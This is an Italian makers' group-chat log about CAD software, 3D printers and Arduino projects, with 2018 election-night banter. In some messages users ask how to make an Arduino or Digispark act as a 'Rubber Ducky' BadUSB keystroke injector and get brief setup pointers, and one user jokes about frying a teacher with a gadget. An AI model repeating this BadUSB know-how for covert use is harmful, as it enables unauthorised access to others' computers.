Devo creare un modello 3d da stampare su carta, nulla di che
autocad, AUTOCAD, anche se non è leggerissimo...al massimo fusion 360
Voglio fare qualcosa di efficace 
Sì, è una REPL che sta sempre aperta sulla seriale, con cui puoi eseguire codice per fare cose bellunose
si ma no, c'è, NO
non c'è gusto....
Non è a pagamento?
Mi serve solo per un disegno, poi andrà buttato direttamente il pc 
basta che selezioni "studente" e te lo da regalandoti una licenza da 3 anni
E lo ripeti fino alla tua morte
Ahahahahah
Con Photoshop?
Niente account studenti?
beh, autocad è comodo nel 2d, nel 3d ci fai un secondo l'abitudine e ci sei, se è solo un disegno in 3d fai di fusion 360 anche se non so quanto pesi, comunque certamente meno di autocad, credo sia il migliore a sto proposito, anche se io non l'ho mai usato
beh, come a scuola nostra
Ahahahahah
 mi puoi aiutare quindi?
beh, se è per trasmettere usando uno o due pin analogici in pwm emulando con le onde quadre delle sinusoidi trasmettendo in AM io ci sto, se è con quei moduli da 433MHz non ne ho mai avuti/usati quindi noh
per ricevere diventa un peeelo più complesso però con il mio sistema...ma vabb, dai
no beh sarebbe bello vedere come si riesce a conservare le informazioni, tipo trasmetterle, sintonizzarsi con una radio sulla frequenza giusta e riceverle con un microfono vicino alla radio decriptandole tutte, sarebbe da provare
Almeno qualche indizio su come procede?
Provaci allora no?
avessi una radio
Ahahahah
Peso da scaricare, perché non ho una gran connessione
sono introvabili quelle in AM che ti mollano tutta la banda per bene, e se le trovi costano un botto
Poi può pesare anche 10gb nel disco
Ma tu hai tanti soldi vero?
hehehe
noon ne ho idea...per autocad stai sui 7GiB da scaricare ma come server davvero si scarica ultravelocissimamente, per fusion non ne ho idea
fusion dovrebbe occupare tipo 2.5GiB sul disco per dire
Fusion è free?
stessa storia di autocad da quel che ne so
Ho una connessione da 4mb/s che però va lenta sul pc
Ma che cazzo?
tranqui, è normale, siamo in italia comunque i server che hanno riescono a farti scaricare tutto al massimo della banda che hai da quel che ho visto scaricando io autocad quindi vai tranquilla che fa veloce
si si era un problema con chrome
Speriamo
Io vado al massimo a 700mb/s
Che sondaggio vuoi? 
Un exitpoll anticipato? 
-8
Possiamo parlare di politica?
No
Daiii
Ho accumulato meme belli 
Valgono le solite regole di rispetto, per lo spam, per il flood, ecc
Ovviamente
Se non sono esagerate anche sì
ecco
e per il flame, aggiungo
Il più semplice quale sarebbe?
Vero
annuncio semmai? 
Cos'ho scritto?
warn hahaahahah
Perché è un disegno mooolto semplice, sono due pezzi cilindrici e due rettangolari, un paio di bulloni ed un buco
So' copà, veci 
why?
Sketchup


Boh so che è il piu facile mai provato
È dal 5 febbraio alle 14:00 che non ho avuto un'ora per stravaccarmi, cazzeggiare e riposarmi
Esattamente un mese 
-2
:3
contati, eh 


Movimento 5 stelle – 2
 25%

Centro-sinistra – 2
 25%

Centro-destra – 2
 25%

Partito Comunista – 1
 13%

Casapound Italia – 1
 13%

Liberi e uguali
▫️ 0%

Sinistra rivoluzionaria
▫️ 0%

Potere al popolo
▫️ 0%

Forza nuova - Italia agli italiani
▫️ 0%

Il popolo della famiglia
▫️ 0%

 8 people voted so far. 

perdonatemi
oh madonna santissima
ho sbagliato
mancava 1 minuto

ecco adesso è ok
Manca qualcosa 🤔
Fratelli d'Italia non ci sta
coalizione centro destra
riempire i log del gruppo: lo stai facendo nel modo giusto 
Votate

perchè non votate 
perchè non sono obbligati 
sottinteso
Perché il voto è segreto (?)
Che hai detto?!
ha senso non voler dire per chi si ha votato
anche qui
mica posso vedere chi ha votato cosa
"Sono distrutto, amici"
se uno non vuole dirlo mica puoi imporglielo 
Google calendar non mente
lo so
Ma uno non potrebbe volere lo stesso
In quale lingua?
Veneto?
Nuoo era politicaaa
sisi, veneto 
Elezioni - chiusi i seggi, primi exit poll:

• M5S 29- 33%

• Centrodestra 32-36%: è testa a testa tra Forza Italia e Lega. FdI al 4-6%

• Centrosinistra 22,5-26,5%: Pd tra il 20 e 23%, segue +Europa con il 2-4 % circa.

•Liberi e Uguali: 3-5%

Affluenza intorno al 70%.
maronn 10:59
Qualcuno la tolga
*bestemmia* *bestemmia* *bestemmione*
Perché?🤷‍♂
Perché Forza Italia e Lega sono sopra PD
Per me l'ha fatto per andare a votare in quegli ultimi 30 secondi
Sei del PD?
Non si era capito?
Lo prendo per un si
ah ma son le 11
i sintomi della batteria CMOS scarica
No🤷‍♂
è rimasto all'orario di quando avevo spento il PC sabato 24
lol 
Comunque perché secondo te Renzi dovrebbe ancora una volta governare il paese? Non ti pare che ha detto 
 bugie?
bene, gli ho forzato il sync dell'ora ed ora ho l'ora di Londra, gg riconoscimento automatico del fuso orario
madonna aspetta che ho una perla
1. Renzi non governerà
2. No (?)
Manca il congiuntivo... "abbia detto"
Shhh
Giusto per rivedere zeb89 in live nel momento delle votazioni che ai tempi era pronto a comprare un biglietto di volo e andarsene dall'italia se vinceva il si
Referendum: "se vince il no non mi ricandido"
sono il primo a dire che Renzi dopo la stronzata che ha fatto sarebbe dovuto sparire, ma dove sta scritto che Renzi andrà al governo? Anzi, molto probabilmente sarebbe stato Gentiloni il premier
Mh non hanno detto niente certo
"non è che mi dimettoh, smettho hrohrio di fare pholitica"
Con Gentiloni molti partiti sono disposti ad allearsi, con Renzi no.
Non so scrivere in toscano 🤔
Uooops

Aggiungi la Baruz al gruppo 
Poi seriamente preferite la destra al PD?
Emh si?
Tra tutti... Grazie a Dio faccio i 18 tra qualche mese quindi non ho avuto il problema di scegliere
La destra non ha fatto jobs act e buona scuola, per dirne due sole. E il Pd ha appoggiato anche fiscal compact e Fornero
(che poi sono leggi che la destra ha appoggiato uguale sono dettagli)
"pensaci dai"
L'hai visto parecchie volte quel video?
Sicuro sicuro?

L'ho censurata
Non hai censurato le zinne
lol wtf
ahahahaha
Ho censurato male
Rifaccio

Okay?
Menomale che silvio c'è
Lol

e questa? 
Hhahahahah
Ah beh decisamente meglio sentire quel tipo che propone la flat Tax, l'uscita dall'euro e "tutti a casa lorooo"
Quando è andato a votare il Berlusca
menomalee che siiivliooo c'èèèèè

Non hai visto il video?
Ahahahah
come fai ad essere del pd dopo tutte quelle riforme che ha applicato sulla scuola (jobs act, buona scuola). Ha ragione 
 meglio non fare politica su questo gruppo
non importa cosa avete votato: alessandro borghese con il suo voto può ribaltare la situazione
teniamo questo gruppo solo come makers
io sono del partito comunista
Marco ha concesso la politica stasera. Io ero contro per dire
Eh ma scusa, scrittre o non scritte suppongo il berlusca abbia apprezzato come avrei apprezzato io
Ni
Ha spostato la testa
E il 97% dei maschi del pianeta probabilmente
Aspetta che mando il video
Integrale 
Un poti poti ci stava
Tanto ironico

Siamo in Italia oh
Sapete qual'è il problema?
Piano col dare della sinistra al Pd.
 quanto hai pagato la tua bici?
L'apostrofo in questa frase
Bah l'avrebbero fatto anche all'estero... Certo che è un'azione fine a se stessa e per la propria visibilità, di politico non conclude nulla
Il correttore, Sorry
Comunque il correttore inn questi telefono è una merda
Non ne azzecca una
WTF hahaha la mia bici gialla è di quando ho fatto la prima comunione penso 
è una 28"?

Comunque quel video lo ha mandato mio padre 🤦‍♂️
Io mi preoccupo di queste cose
povero berlusconi: per fare bella figura non ha potuto neanche guardarle le zinne
Ahahaha
Hahahahahahah
Avrà rivisto il video su YouTube a loop
sisi
"Ma sei scema" ahahahaha
È più dritta di come l'avevano dritto i giornalisti i quel momento 
Capitela.....
quando hai la TV a 20cm ma non hai sbatti di accenderla
Idem 
Ahahaahaha
Sei troppo pigro 
già
Ho roba io più lunga di 20cm
HAHAHAH
Ahahahahah
cos🤔
AHAHAHAHAHAH
purtroppo sì.
tanto il loro governo dura 2 anni e si torna ai tempi di Monti

Marco ma come fai a seguire due live capendoci qualcosa?
Ma non le segue tutte e due 
Hanno due toni di voce diversi ☺️
._.
a me fa venire mal di testa sentire due o più persone parlare contemporaneamente
Come no... delle 12h di MK sto vedendo solo l'ultima mezzora...
parlando di cose serie? Quanto dura la pubblicità di La7?
finita
ancora n*ok anche qua
e mentre scrivevo "ancora no" mi ha preso un infarto con la sigla
Aiut perfino sul guardian il faccione 
Vabbè che lo usano come mega clickbait perché uno straniero vede Berlusconi e si triggera 

Ma avevate visto il video sulle elezioni di John Oliver?
Invece è top, mentre la tizia cicciona parla da Mentana c'è MK che canta addio addio amici addio dall'altra stanza 
🤣
Yes 
La tizia cicciona è Lucia Annunziata 
Ah non l'ho sentita annunziare 🤔
Si chiama così...
Vi consiglio di andare su Twitter su 
 se volete divertirti
Però se siete 5 stelle evitate
noooo pubblicità
corro


È un po tardi ma se non lo avete visto guardatelo, John Oliver è un mito
Ahaha me la sto guardando in live
Questa è una delle tante perle
HAHAHHAHAHAHAHA
Mentana é una certezza
AHAHAHAHAHAHAH
Comunque tra una settimana e due giorni ho appuntamento per il passaporto
Dovrei essere in tempo
ahahahahahahah
apperò
Già mi vedo un Ms5-Lega

Addio e grazie per il pesce...

te la danno a giugno/luglio
Io sapendo che ci sarebbero state le elezioni l'ho fatta a dicembre 
 
Ma è la via di casa tua? 
Ah non avevo letto bene 
Questura DIY

ecco Di Battista che parla
vado a prendere i pop corn
Io adrei fuori dalle balle in America... Se Trump mi vuole
chi ha votato casapound che lo vengo a cercare a casa?
Basta vedere chi alza il braccio destro 
Ok, 2° proiezione tra poco
Oh, I see you are a man of culture as well

un altro che aveva detto che spariva
Non si era ritirato a fare il padre di famiglia?
ahahahah
Che poi sia lui che l'altro hanno detto due cagate e basta ahahah
comunque sempre belli i discorsi di M5S
come se stessero parlando con le pussy
spari due cazzate e te le porti a letto
*ha
ahahahahah
Beh ovvio, in questo momento nessuno di nessun schieramento si sbilancia a dire diente
Il problema è che io l'ho imparato a fare alle elementari
Mi spiace per Celata però...
BQHHAHAHAHA
Hahahha shy

...
20 minuti di pubblicità
Hanno detto a che ora arriva la terza proiezione?
nop
poi uno a quest'ora mi chiede di leggergli il datasheet di un mosfet
Sera ragazzi
 Bot per le elezioni politiche del 4 marzo 2018
 Programmato da Marco Aceti 

Marco Aceti? Serio ahahahah
giocavamo insieme a Minecraft
Lol
poi si è messo a fare i bot credendosi un Dio
y
Ho ora capito come faccio a fare inviare i messaggi al bot usando un linguaggio di programmazione
*comando che mi fa prendere la chat_id e me la salva in una variabile scoreboard*
*comando che legge cosa scrive l'utente*
*con degli if e else io rispondo prendendo dall'API di viaggiotreno che mi serve*
Il bot dell'orario dei treni
Feels
maronn
Ahahahah
gliel'ho betatestato fino alla morte
e il giorno che mi serviva
NON FUNZIONAVA
Quindi non serve?
Per i treni ci sono applicazioni con molte funzionalità utili
Tanto la mattina uso il pullman 
Io prendo il treno e dalla stazione all'uni c'è un pullman ogni 5-10 minuti (e comunque sono sovraffollati di studenti)
Di dove sei?
Ogni tanto incrocio cicca e romboli 
ma il bot in collaborazione con ultimora WTF?
Io e MarcoBuster avevamo fatto discussioni non molto piacevoli col fondatore di quel canale...
Bello l'internet
Siete tutti grandi e del nord.....che palle
lol
Caffeeeeee
Con la macchinetta che si rompe
World wild web grazie
Madonna le bestemmie
Domani dovrei arrivare in uni per le 10 se vuoi xD
 hai fatto colpo 
io fino a stamattina ero lì
Adesso?
adesso a Roma
Il caffé insieme lo abbiamo già preso qualche giorno fa, e si è bloccata la macchina del caffé rubandomi 1€
non sono riuscito a trovare un'oretta in una settimana per salutarli
L'avranno hackerata i russi
vabbé, l'anno prossimo al MFR voglio la foto con cicca
No, i fottuti ugelli si sono disintegrati su un bicchiere che si era incastrato
Ah
Meglio la mia versione
Più appassionante non trovi?
che culo
la macchinetta nella mia scuola mi ruba anche 3/4€
Rip Marco
scorri le mie foto del profilo
Nella mia scuola la macchinetta.....no, niente, nella mia esce acqua al posto del caffè 🤦‍♂️
Oh, incontrari 3 o 4 volte al massimo in 5 mesi, prima volta che ci prendo insieme il caffé
Ah a quello ti riferivi... Mi ha rubato solo 1€ perché quello c'era dentro...
Ahahahah
Beh parla quello che è a pochi chilometri
Fattelo dire......sei proprio basso
ma ma
sono 1,75m
Quanto cazzo è alto Marco?!
TANTO
e anche 
Minimo 2m
Tanto
1,95
che culo era riferito alla macchinetta che si è mangiata solo 1€
Chi si vede
La Madonna
quando l'ho visto mi sono triggerato per l'altezza
Infatti quando l'ho trovato a Padova lo guardavo dal basso all'alto
1.94
Te quanto sei alto?
☺️☺️
Io vorrei vedere la maratona, ma domani mi sveglio alle 6 
Vabbè, bisogna anche dire che hai 23 anni (o almeno credo)
21 in realtà
☺️☺️
Raga domani scrivo a human safari per fagocitarmelo per un pomeriggio... idee su cosa proporre?
Allora sei più o meno giusto

Il BMI dice che sono sottopeso
Viaggio in Russia
Quanto pesi scusa?
70?
Ahahah
Nono, da fare nel pomeriggio di giovedi 15
Eh già...
Boh sarò anche aumentato.. sui 71 diciamo 
Che bello Android
Quanto la tecnologia ti aiuta nel quotidiano? Secondo te la tecnologia avvicina o separa? La usi molto nei tuoi viaggi? Il paese dove più era sviluppata? Il paese dove meno era sviluppata? Hai sentito parlare in corea di Red star os? Se si, cosa hai pensato? Secondo te ha influenza?
Ahahahahah
Sei mooooolto sotto peso
La cosa ti è sfuggita un po' di mano
Vabbé tanto tra poco stacco
Magari se uscisse una terza proiezione sarebbe ottimo
 possono bastare?
A me non frega più di tanto
Wow, non sono l'unico ad essere considerato sottopeso hey
Mmmh una FAQ è noiosa... certo che ho anche il drone rotto cazz... ☹️
mitica
Quindi qualcosa riguardante le riprese o i droni?
io domani dovrei studiare mezzo programma d'italiano
Molti si sono alzati (capiscila)
gli si è sollevato il trapianto di capelli a zio Silvio
Ahahahahahah
Non ha potuto guastarsi la live però
Vabbè ragazzi, vado a vedere come funziona esp8266, buon proseguimento!
🤔Svizzera? ma voi Trentino-Alto Adigesi non vi sentite tutti un pò tetesken e austrhungarien?
Marco è troppo ricco
Se è così ricco come dici.....perché compra da bangood?🤔
Perché gli ingegneri hanno il braccino corto
Non ho capito
🤣🤣🤣

E invece
"ma che è? e se arrivava obama cosa facevate?"
ahahahha fa morire mentana
Quoto
Infatti ora devo staccare e mi spiace un casino
Però domani ho 8 ore di scuola e non posso arrivare del tutto addormentato
serious? 
Più che altro è inutile discutere, le opinioni di persone diverse sono diverse
è come se dicessi che 3+6 fa 9, e tu mi ribatti dicendo che non è vero, ma 4+5 fa 9
HAHAHAHAHAAHAHAHAAHAH
chi credi che li abbia pagati i fotografi per fare tutte quelle foto? 
mmm in effetti 
no no
è fake
Mi sa che devo rimettere itz salveene come nome


mi sa di si 
Ci possiamo ritenere fortunati
Gigi?
Faccio le superiori, ma non me la trova la scuola
Cosa metto qui? 
In teoria te la dovrebbe trovare... prova a mettere la città o la provincia
Ho scritto "itis", ma non trova quello della mia città
La Basilicata non esiste proprio 
Metti OTHER allora
Oppure la prima
Quindi metto uno a caso? Le altre regioni escono
è coperta dal basilico e non la vedono manco i satelliti 
(si scherza)
Sei lucano?
nope why?
Per sapere il basilikos 
Ah 

No
È questo quello che devo installare?
DraftSight >>>
 FInalmente qualcuno che usa reddit
:3
però ancora nessuno ha risposto ahah
Non c'è molta gente su r/italyinformatica, saranno tutti al lavoro.
È potente? Cosa riesce a "rompere"?
Credo che un po di acqua la scalfisce
Giorno
Giorno
Giorno
Avrei una domanda: come si impara a pensare ad oggetti?
Mh pensa di fare la scheda tecnica di qualsiasi cosa che ti circonda
ehm....non credo di aver capito. Intendevo dire "come si impara a pensare Object Oriented? Perché ho il difetto di pensare, non so come dire, proceduralmente"
Lui intende:
Creati un modello di scheda tecnica, tipo:
Marca, modello, dimensioni, peso..."

E per ogni prodotto che vedivla riempi in modo diverso
E vedi che la variabile è sempre marca, ma per un TV sarà Samsung, per un amplificatore Yamaha, insomma è relativa all'oggetto
ah ora ho capito il nesso! Grazie!
Sono 50mw... Non è potentissimo, ma un palloncino lo scoppia
Io l'ho preso principalmente per il raggio
io ne ho uno da 5mW che uso per far giocare la gatta
e il bello è che mi era arrivato rotto dalla Cina
richiede due pile mini stilo (AAA), sul case esterno in metallo passa il positivo e il negativo all'interno (scelta che boh...), ma la cosa bella è che non c'è niente che regge le pile, se lo agiti le senti che sbattono da una parte all'altra e non toccano, ci ho dovuto creare un supporto io per farle stare ferme

Io ne ho uno costruito uguale al tuo, ma ha il laser montato su un tubetto che si può piegare... Immagina
Se stai installando AutoCAD, si:)
Sisi AutoCAD 2018
È arrivato a 2.8GB
Se sei interessata puoi anche scaricare la versione per studenti e lo hai 3 anni gratis
Sisi ci mette un po..a seconda della linea ovviamente
Si quello ho fatto, ho avuto problemi a trovare la scuola ma poi ce l'ho fatta
Perfetto:)
Sinceramente mi aspettavo di più. Ho una connessione da 4mb che va ad 1mb, ma ci ha messo solo un paio d'ore per arrivare qui
Buono meglio cosi:) Io lo feci in facoltà e ci mise un paio di ore..
Qualcuno di voi ha ordinato da hobbyking
Global, con frdex?
Pls è urgente
beh si, ci mette 2 settimane di solito la roba ad arrivare
Con fedex priority?
boh, io prendo quella che costa meno di spedizione
Da dove spediscono? Probabilmente c'è dogana
Hong Kong
C'è dogana xD
Quanto?
+30%
Avevo letto anche 100% è una bufala?
Il 30% mi va bene
Su 100€ di ordine e 30€ di spedizione ci sta che ti venga anche 40€
A me sono 122€ e spedizione gratis
40 mi vanno bene
Quale stampante?
Fabrikator mini 2
Boh non so con la dogana è un mistero... Per me c'è la possibilità che arrivi
Vero
Non credo possano chiederti 100€ di dogana
Eh speriamo di no
Mai sentita, uhh è piccolina,
Sisi
Fin troppo piccola però è chiusa ben fatta sembra
Stampa 100mm×100mm×100mm
Per quello che serve a me, va bene
Sisi solo che se dicono 10x10x10 superare i 7x7x7 può essere difficile
Mhh dicono il massimo stampabile
Sì ma sei un po' al limite, meglio non arrivarci, poi magari quella stampante non ha problemi e ci arriva tranquillamente
Hai perfettamente ragione, infatti dividerò il progetto in tanti piccoli pezzi, da assemblare, così da non avere problemi
Forse non l'ho letto, ma che materiale devi stampare?
Pla, ma per provare ho comprato anche abs
Ma la tua ora stampa?
(Chiariamoci, uso le stampanti 3d da circa 4/5 anni)
Ha il piano riscaldato?
Si
Ah ok, dai sembra carina, sicuramente bella da piazzare sopra una scrivania
Siii
Ieri ho messo marlin, ma arriva a 205° con target 215° e dopo qualche minuto che non sale più mi da un errore
Ho mandato la foto sull'altro gruppo
Ah ok, pensavo avessi già rifatto il PID
Ragazzi qualcuno sa aiutarmi con la digispark? Non riesco a configurarla bene con win, non viene riconosciuta come keyboard dall' ide di Arduino e quindi non mi permette di scriverci su il codice
O la costante integrale del pid si è persa per strada o c'è qualche altro problema
Sono temperature belle alte.

Se hai una Anet A8 hai montato i Mosfet ?
Comunque controlla la ddp erogata dall'alimentatore, poi rifai il pid
Ho una cr 10 mini
Appena avrò tempo controllerò grazie mille!
Ma se imposti 225 arriva a 215?
Cmq per ABS non serve superare i 200
Si
Per pla al massimo
L'abs si stampa sui 250
^^
Avete ragione ricordavo male
Secondo me è decisamente il PID sballato hai un offset, può anche dipendere da un alimentatore regolato troppo basso in tensione e il controllore non fa scaldare a sufficienza rispetto a quello che crede
Assurdo Mentana
È al 15esimo caffè
Eroe nazionale
Raga ma il root su Xiaomi mi A1 resetta il tell ?
Su AutoCAD l'unità di misura è il mm?
Se disegno un parallelepipedo di lato 30, sono 30 mm?
Sì
È in unità
Però puoi anche mettere in mm
sisi
Dove cambio?
è già di suo in mm
Ah
tranqui, usalo e poi vedi, al massimo fai un tentativo, esporta un cubo e vedi, ma dovrebbe stare in millimetri
Se devo fare buchi in un oggetto come faccio?
I due parallelepipedi grandi sono staccati, però devo fare quel foro quadrato centrale in modo che si tolga una porzione ciascuno
usa le booleane, cioè, estrudi entrambi e poi in alto c'è il tastino "sottrai" con il simbolo di due cerchi uno pieno e uno vuoto tipo e usi quello
Domanda.....posso usare Arduino uno con il codice della Rubber ducky per renderla tale? Si vero?
Penso di si
Mhm, non riesco a farlo andare 
Secondo voi, cosa potrei farci? Dato che tra poco non la userò più
Venderla
mi sembra ne abbiano fatto uno pure per arduino uno ma è un peelo buggato....inoltre lo devi flashare e dopo fa solo quello quindi non so se si possa tornare a come era prima, comunque su github dovresti trovarlo
Non saprei dove
Che stampante è?
Print-rite
Colido 3
Subito
Ah, allora aspetto DigiSpark
Già provato, nessuna risposta
fai parallelepipedo con entrambi, magari quello da sottrarre lo fai un po' più alto per selezionarlo meglio e poi fai sottrai e leggi sotto nella linea di comando cosa chiede, dovrebbe essere quello da cui sottrarre, tasto destro, invio, e poi quello da cancellare, tasto destro, invio
E con Arduino micro cosa ci potrei fare?🤔
regalamela
Facebook
Comprala
con quella quel che vuoi...riguardo alla memoria, potresti metterci una micro sd da quel che so ma non ci ho mai provato
10€ e chiudiamo?

ne ho già una ma sai com'è, averne un'altra non mi dispiace
Qualche progetto interessante?
Quale hai?
io la uso per il microscopio :D
Regalarla a marco
Io non ne ho nessuna quindi ho la priorità 
la mia amata anet a8
Che usi?
sei arrivato tardi
Costante

Con esp 32 invece?
Con Arduino Uno?
l'arduino leonardo pro micro, mi scarica da cmd usando bitsadmin l'eseguibile del progetto compilato per usare il microscopio....tuutto con opencv
Troppo complicato...
è facile ._.
Oltre Arduino che usi?
ed è anche tutto su github, l'ho mollato li
beh di solito il raspberry pi 3
Dico per il microscopio
a per quello un potenziometro, la webcam moddata, i led che devo ancora trovare e il telaio stampato in 3d, i progetti devo ancora metterli su github....o su thingiverse, ci penso su, fatti con autocad tra l'altro
Non ho niente da utilizzare se non la scheda 
e mi manca fare il blocco dell'usb hub, prima penso ad uscire dal periodo di verifiche di scuola però
La butto.....un temporizzatore con Arduino si può fare?
non ho tempo di mettermi a saldare robba per ore
tempocosa?
Si, ho letto più messaggi riguardo il tuo microscopio 
Quella presa da cui tu imposti il tempo e dopo quel tot si spegne
beh...come lo imposti il tempo esattamente?
per il resto si, sono tipo 5 righe di codice...
Era solo un'idea 
Certo
Con esp 32?
Venderla? XD
basta mettere un k=il tempo che hai impostato; val=millis(); e un if(val<k){fai cose magggggiche che vuoi fargli fare tipo dare corrente o altro};
Solo che ho solo: Arduino uno, due micro, 3 sensori di prossimità, breadboard, cavi e  esp32
si...tipo 20 volte la mia attrezzatura
Si ma la luce? Dove la collego?
un led su un pin digitale e il gnd e poi lo usi come e quando vuoi con digitalWrite
?! Però te recuperi con l'anet
Ti serve sicuramente un relè
Il resto boh
da 1 a 10 quanto sarebbe pericoloso portare una cosa del genere all'esame di 3^ media?
naah, solo per i telai semmai
Eh, non ne ho uno 
Ragazzi
9/10
beh...io lo farò al 99.99% con l'esame di quinta, all'esame di terza media non ti serve niente, vai la e li saluti, tiri 2 battute e ti mollano con il 10 all'orale, è una cagata dai
Secondo voi, mi conviene togliere le lipo dall'ordine e quindi usare dhl express e non fedex?

è una bestemmia chiamarlo esame quello
Mi hanno tenuto 45 minuti
a quello di 3 media?
 mi toglie solo una parte
Come fai ad alimentare in 220V? xD
Senza lasciare respirare un secondo
Si
Per quello dicevo 
perchè tu sei una persona triste, io sono andato, ho tirato 2 battute sceme e si sono messi a ridere....poi ci siamo salutati, 9/10, yee
C'è differenza fra il Vicentino e il Salento
Qui i prof sono bastardi
Devo creare una cosa così
naah
perchè qua no?
e vabb, se vuoi passami le misure e te lo faccio, basta che mi dai altre 2 ore di tempo
45 minuti, mi hanno cercato in tutti i modi di mettermi i bastoni tra le ruote (e ci sono riuscito) hanno messo in dubbio i collegamenti fatti da loro stessi, e non hanno nenache visto quello che avevi portato
Ma no non ti preoccupare, volevo capire come si facesse
VERISSIMO
Ma in 3d o in 2d?
3d
prima disegnalo in 2d, poi alza le pareti finchè ti serve e poi usi sottrai, dai un'occhiata su youtube al massimo
Ma fallo in tinkercad che è più intuitivo di AutoCAD che poi è progettato  per il 2d
Puoi direttamente disegnare il profilo in 2d ed estruderlo...
si..e io cos'ho detto
Senza sottrarlo
c'è si, anche effettivamente, senza usare sottrai intendi
sisi, anche
Ah... Ora ho capito il motivo per cui non va
Non mi hai nenache cacato
beh...beh...beh...io ero un'eccellenza quindi già sapevano che sapevo tutto e mi hanno passato liscissimo in 2 minuti
Che né te né i prof saprebbero cosa è
metti caso qualcuno si va ad avvicinare un po' più del dovuto?
V A F F A N C U L O
e tu per sbaglio alzi il voltaggio di un peletto
e se tipo si va a friggere STRANAMENTE la mia prof di inglese 
A che ti servono le lipo xD
Ce l'ho fatta finalmente xD
Devo costruire una cosuccia
che mi sta """"""""""""""""""""""""""TANTO SIMPATICA""""""""""""""""""""""""""
gg
Se hai comunque spedizione gratuita prendi quello che vuoi no xD
Il problema è che hobbyking si droga
Mmm
Perché cambi quella stampante con l'altra?
Mi occupa troppo spazio, e sta avendo tanti problemi
Per curiosità a quanto la volevi vendere?
Sui 100€ non di più
Ah ok, forse a quel prezzo la gente trova la anet a8 e la preferisce
Probabilmente si
Anche se forse ti conviene aspettare di vedere come stampa la nuova prima di dare via la vecchia
Hai assolutamente ragione  speriamo bene
Buona fortuna
chi può autarmi con uno sketch arduino?
devo fare che quando un pin è high fà una cosa e quando è low la ripete
ma deve farla una sola volt
usa un bool no?
Come?
bool tr=true; tutte le cose che devi fare... e poi if(il pin è high && tr){fai quel che devi e poi tr=false;} e tutto nel loop()
Non ho capito
se lo devi mettere nel loop, se lo metti nel setup non serve neanche, lo esegue solo una volta
Puoi farlo un'attimo tu nello sketch per favore?
quale dei due if vuoi che si esegua una volta solo?
tipo così
Nel caso fosse l'alimentatore?
Che tensione butta fuori? Avevo visto un trimmer di regolazione....
Almeno controlla che a vuoto sia nell'intorno di 12V
sulla destra hanno quell'adj
si, funziona solo una volta, ho messo il bool apposta per farlo solo una volta, hai detto che doveva fare solo una volta, se è per quello cancella il bool
a capito, allora devi fare...come fai a controllare lo switch dal codice?
c'è in pratica tu dovresti fare un contatore int k=0; per esempio e farlo aumentare fino ad uno nell'if e negli argomenti dell'if metti(statomotore==HIGH&&k<=1){robba varia;} e il k++; va messo nell'esecuzione dello switch a sto punto
si maaa, lo switch se non lo puoi controllare dall'arduino mi sa che è un po' un problema
hahaha chi ha cliccato stop? 
prova aggiungendo questo alla fine del loop
dovrebbe rispondere solo agli admin 🤔
ma che è sta taroccata di google traduttore
no si, probabilmente c'è qualcosa nel loop che non sto considerando, ma ora non ho tempo di pensarci su mi dispi, dagli un'occhiata te al massimo, da qua ce la si dovrebbe fare a risolvere sta cosa
Raga ma sto transcriber bot è magnifico .-. Come riesce a capire le parole,e di più  non mettere le parole inutili?
a ecco, allora apposct così
Falzi kontatty!11!11!!!!!11!1!!1!
puliscili
Maah aspettiamo i 600, l'ultima pulizia ha fatto una strage haahhaahah
Qualcuno sa dirmi un programma che corregge gli errori dall'hardisk
Ciaoo

non credo serva, usa chkdsk no?
Grazie mille! Basta che con un tester tocco un V- e un V+ qualsiasi?
Come faccio a ruotare un cilindro su AutoCAD?
Ruota solo in un verso, ma io voglio farlo ruotare diversamente

Così
10 per il disegno!
Sì
Fai il cilindro e poi giri lo schermo
Grazie
quando sei in modalità 3d con sopra i tasti estrudi e quant'altro, hai anche il ruota 3d che puoi usare per ruotarlo in x,y o z come vuoi te
Gizmo rotazione?
si chiama ruota 3d
comunque è solo un simboletto, è tipo una specie di globo blu, verde e rosso
sopra ad edita in seconda fila di altezza
secondo voi quanto mi faccio male da solo saldando in camera da letto?
Chiedi ad Ivan xD
l'unica cosa che so è che sto stagno è cinesissimo
here
pure io, sempre, comunque, anche stampo abs, non rubarmi le droghe
fa un botto di fumo e non salda manco per il cazzo
prima ci ho messo 2 minuti a saldare un solo pin dell'arduino perché non si attacca sto troio
io ho trovato un acido per stagno, che, da quel che dice, dovrebbe essere cloruro di zinco, che invece che essere bianco è marrone scuro e ultradenso e oleoso, e avrà tipo 999 anni
ne ho uno così anche io
vi volete fare due risate?
sto stagno non attacca, lo tengo più tempo e mi fa un gocciolone... Ora ho 3 pin cortocircuitati
fanno sempre bene
la potrei usare come stucco quella cosa
appena è arrivato questo messaggio il monitor mi si è spento a caso... 
ah
Salve, qualcuno sa per caso dirmi perché quando inserisco la Rubber ducky quella del video di overvolt, il computer dai il suono di quando si inserisce un dispositivo ma dopo pochi secondi fa il suono come quando si rimuove, è come se la mettessi e togliessi ?
Sapete magari come potrei risolvere ?
Attento che fai stare male corrado così
allora oooooooooooopps
è normale, semplicemente non avendo nulla da fare lui ha solo il codice che dice "inizializza la tastiera" e subito dopo "terminala", appena ci inserisci un codice lei se lo inserisce e lo esegue prima di "staccarsi" almeno virtualmente
Si quello okay però è come se non vedesse la chiavetta inserita e non mi fa caricare lo sketch
eemmmhhh...tu che cosa usi come badusb esattamente?
hai quella ufficiale da 50 eurini cari?
La stessa di overvolt
Quella del video
Quella di banggood
che io ho guardatono, apparte ciò, non mi ricordo quale fosse, era un arduino no?
Si è quella
si ma quella non è una rubber ducky, è in primis un arduino, lo programmi come ogni arduino, sei tu che devi farlo diventare una rubber ducky
installa l'ide di arduino e poi puoi fargli gli sketch che usando keyboard.h o digispark te la virtualizzano come tastiera e fanno da rubber ducky
Okay va bene grazie
 come si chiama quel programma o almeno credo che usi per vedere i processi di Windows ? 
Dove vedi i dati di CPU RAM ETC
ls 
Quello di Windows è il Task Manager, lui ha installato Process Hacker
thanks
solo per il nome proprio

giusto per dare atmosfera
Buonasera:) Conoscete un buon paio di auricolari da circa 30€ o meno per il telefono?
Xiaomi hybrid pro
Grazie le cerco:)
Ma spe cuffiette o auricolari
Auricolari
Mm no allora no... Queste sono cuffiette
Cuffiette in che senso
Questi sono per me cuffiette e auricolari
Sto provando con la digispark ma da questo errore, qualcuno sa come risolverlo? Ho googlato ma nulla non capisco
Hai messo all'inizio 
 <Keyboard.h> ?
Queste hybrid vanno bene:) grazie:) e da dove mi conviene ordinarle?
Si
Gearbest di solito... Le trovi spesso in offerta
ohhhh
Use minecraft redstone for saving bytes of code
ahahahahah
a proposito di programming in command blocks
